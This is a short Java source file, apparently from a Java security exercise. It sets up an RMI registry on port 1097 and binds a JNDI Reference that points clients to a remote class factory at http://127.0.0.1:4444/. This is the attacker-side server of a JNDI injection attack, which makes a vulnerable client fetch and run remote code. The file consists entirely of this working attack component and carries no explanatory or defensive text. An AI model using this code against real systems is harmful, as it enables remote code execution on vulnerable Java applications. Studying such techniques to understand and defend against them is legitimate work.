package javasec2;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws Exception{
        Registry registry = LocateRegistry.createRegistry(1097);

        String FactoryURL = "http://127.0.0.1:4444/";
        Reference reference = new Reference("ReferenceClass","TargetClass", FactoryURL);
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind("Target", wrapper);
    }
}
